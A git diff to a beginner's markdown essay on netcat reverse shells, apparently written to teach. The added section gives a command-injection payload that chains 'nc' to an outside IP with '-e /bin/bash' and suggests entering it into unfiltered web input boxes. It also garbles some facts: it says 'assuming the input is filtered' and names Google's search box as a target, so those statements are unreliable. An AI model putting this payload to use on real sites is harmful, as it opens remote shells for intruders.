@@ -27,3 +27,14 @@ nc $ip $port [arguments]
 ```[arguments]``` Referse to possible arguments you can pass, such as in this case, the ```-e``` argument
 
 The reason we pass ```-e /bin/bash``` into the ```[Arguments]``` block is becuase that is what makes all the magic of this reverse shell. We utilize the [*bash*](https://en.wikipedia.org/wiki/Bash_(Unix_shell)) shell by getting its path and feeding it to NEtCat via the ```-e``` argument. This forwards the a bash shell towards the offensive machine allowing it to utilize the victim machine's command line.
+# How can i get NEtCat to run without already having a RevShell?
+
+Well some websites may not check what input you give them, such as this website.
+
+![image](https://github.com/SofiaBennet/RevShell-ESSAY/assets/54598875/378075a2-a31d-4952-9f4e-fd8282f10f7a)
+
+```php
+; nc 172.89.245.133 4444 -e /bin/bash
+```
+This simple command fed into any input box, such as google's search box has the potential to cause some serious damages assuming the input is filtered.
+Obviously it's not that easy and it is super common to filter all input form's user input to prevent security issues.
